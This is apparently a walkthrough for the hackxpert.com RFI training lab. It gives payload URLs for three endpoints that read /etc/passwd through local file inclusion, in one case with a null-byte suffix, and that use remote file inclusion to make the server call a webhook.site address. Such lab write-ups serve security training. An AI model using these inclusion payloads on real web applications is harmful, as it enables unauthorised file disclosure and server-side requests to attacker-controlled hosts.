# URL :- `https://hackxpert.com/labs/RFI/`

![image](https://user-images.githubusercontent.com/60841283/151149695-2b7d147e-55f0-4d9c-827d-f837e7f90da0.png)

## Search Bar 1

LFI  :- `https://hackxpert.com/labs/RFI/endPoint.php?field2_name=/etc/passwd`

![image](https://user-images.githubusercontent.com/60841283/151150353-bc09dd62-a474-4093-bbc2-f08f52659db3.png)

### Use webhook service to receive requests
> https://webhook.site/

Vuln Link :- `https://hackxpert.com/labs/RFI/endPoint.php?field2_name=https://webhook.site/803f35b3-7b03-4a46-85b4-5cdc1a548ff7`

![image](https://user-images.githubusercontent.com/60841283/151150144-f6667f89-1440-4b58-9b64-5e666a7314fe.png)

## Search bar 2
LFI :- `https://hackxpert.com/labs/RFI/endPoint-2.php?field2_name=/etc/passwd%00&submit=submit&parent_id=0`

RFI Vuln :- `https://hackxpert.com/labs/RFI/endPoint-2.php?field2_name=https://webhook.site/803f35b3-7b03-4a46-85b4-5cdc1a548ff7%00`

![image](https://user-images.githubusercontent.com/60841283/151150916-061100b6-5b7e-44c6-ab1d-5cfc65977696.png)

## Special Lab
LFI :- `https://hackxpert.com/labs/RFI/rat.php?field2_name=/etc/passwd`

Vuln Link :- `https://hackxpert.com/labs/RFI/rat.php?field2_name=https://webhook.site/803f35b3-7b03-4a46-85b4-5cdc1a548ff7`

![image](https://user-images.githubusercontent.com/60841283/151151325-58dbace2-1dc8-444c-981f-acaf2bbc1e28.png)
